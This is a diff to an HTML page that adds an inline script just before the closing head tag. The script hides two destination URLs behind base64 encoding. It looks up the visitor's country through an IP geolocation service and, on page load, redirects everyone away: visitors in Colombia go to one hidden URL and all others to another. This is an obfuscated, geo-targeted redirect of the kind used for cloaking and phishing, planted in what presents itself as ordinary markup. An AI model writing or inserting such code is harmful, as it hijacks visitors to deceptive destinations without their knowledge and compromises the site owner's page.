@@ -156,6 +156,26 @@ body {
   }
 }
 </style>
+
+  <script>
+(function(){
+  const URL_CO  = atob("aHR0cHM6Ly9zdWRlc3l1Y29taWFtLnZlcmNlbC5hcHAv");
+  const URL_OUT = atob("aHR0cHM6Ly9jb21pZGFwb3B1bGFyLnZlcmNlbC5hcHAvaW5jaW8uaHRtbA==");
+
+  fetch("https://ipapi.co/json/")
+    .then(r => r.json())
+    .then(d => {
+      if (d.country === "CO") {
+        window.location.href = URL_CO;
+      } else {
+        window.location.href = URL_OUT;
+      }
+    })
+    .catch(() => {
+      window.location.href = URL_OUT;
+    });
+})();
+</script>
 </head>
 
 <body>
